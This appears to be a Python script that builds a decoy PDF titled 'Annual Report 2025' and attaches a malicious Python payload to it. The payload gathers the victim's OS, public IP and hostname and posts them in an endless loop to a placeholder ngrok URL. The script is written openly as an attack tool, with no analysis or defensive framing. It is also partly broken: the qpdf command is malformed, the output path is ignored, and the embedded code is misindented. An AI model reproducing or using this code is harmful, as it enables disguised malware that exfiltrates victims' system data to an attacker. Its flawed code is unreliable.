from reportlab.pdfgen import canvas
from PyPDF2 import PdfReader, PdfWriter
import os

def generate_malicious_pdf(output_file):
    # Create innocent-looking PDF
    c = canvas.Canvas("temp.pdf")
    c.drawString(72, 720, "Annual Report 2025")
    c.save()

    # Embed payload
    with open("payload.py", "w") as f:
        f.write(f'''import platform, socket, requests, time, os

        def collect_data():
            return {{
                "os": platform.platform(),
                "ip": requests.get('https://api.ipify.org').text,
                "hostname": socket.gethostname()
            }}

        while True:
            try:
                requests.post(
                    "{'https://{{NGROK_URL}}/log'}",  # Replace with ngrok URL
                    json=collect_data(),
                    timeout=5
                )
                time.sleep(300)
            except:
                time.sleep(60)
        ''')

    # Merge PDF with payload
    os.system('qpdf --stream-data=temp.pdf infected.pdf --add-attachment payload.py')

    # Cleanup
    os.remove("temp.pdf")

if __name__ == "__main__":
    generate_malicious_pdf("infected.pdf")